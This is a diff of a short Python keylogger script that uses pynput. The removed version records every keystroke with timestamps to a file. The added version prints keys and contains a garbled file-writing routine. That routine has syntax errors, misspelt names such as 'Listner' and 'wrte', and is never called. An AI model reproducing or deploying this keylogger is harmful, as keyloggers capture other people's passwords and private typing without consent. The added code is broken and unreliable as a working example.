@@ -1,13 +1,26 @@
-from pynput.keyboard import Key, Listener
-import logging
+import pynput
+from pynput.keyboard import Key , Listener
 
-log_dir = ""
 
-logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
-	level=logging.DEBUG, format='%(asctime)s: %(message)s')
+keys = []
 
 def on_press(key):
-    logging.info(str(key))
+   print("{0} pressed".format(key))
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+def write_file(keys):
+   with open("log.txt", "a") as f:
+    for key in keys:
+      k = str(key).replace("'","")
+       if k.find("space") > 0
+         f.write('\n')
+       elif k.find("Key") = -1:
+          f.wrte(k)
+      f.write(key)
+
+
+def on_release(key):
+  if key == Key.esc:
+      return False
+
+with Listner(on_press=on_press, on_release=on_release) as listener:
+  listener.join()
